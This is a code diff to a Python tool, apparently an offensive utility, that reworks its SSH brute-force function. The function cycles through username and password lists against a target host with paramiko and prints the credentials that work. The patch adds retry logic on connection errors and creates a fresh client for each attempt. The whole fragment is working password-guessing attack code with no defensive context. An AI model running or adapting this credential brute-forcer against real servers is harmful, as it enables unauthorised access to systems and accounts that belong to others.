@@ -96,23 +96,29 @@ def read_valueData(valueData):
 
 def brute_ssh(ip, port, username, passwords):
     print("[+] SSH BRUTE-FORCE STARTING")
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     for usr in username:
         passwordFound = False
         for pwd in passwords:
-            try:
-                ssh.connect(ip, port=port, username=usr, password=pwd, timeout=5)
-                print(f"[SSH] Success: {usr}:{pwd}")
-                ssh.close()
-                passwordFound = True
-                break
-            except paramiko.AuthenticationException:
-                print(f"[SSH] Failed: {usr}:{pwd}")
-            except Exception as e:
-                print(f"[SSH] Error: {e}")
-                time.sleep(1)                    
+            retry = True
+            while retry:
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(ip, port=port, username=usr, password=pwd, timeout=5)
+                    print(f"[SSH] Success: {usr}:{pwd}")
+                    ssh.close()
+                    passwordFound = True
+                    retry = False
+                    break
+                except paramiko.AuthenticationException:
+                    print(f"[SSH] Failed: {usr}:{pwd}")
+                    retry = False
+                except Exception as e:
+                    print(f"[SSH] Error: {e}")
+                    time.sleep(1)
+                finally:
+                    ssh.close()
+            if passwordFound == True: break
         if passwordFound == False:
             print(f"[SSH] No password found for {usr} on {ip}")
 
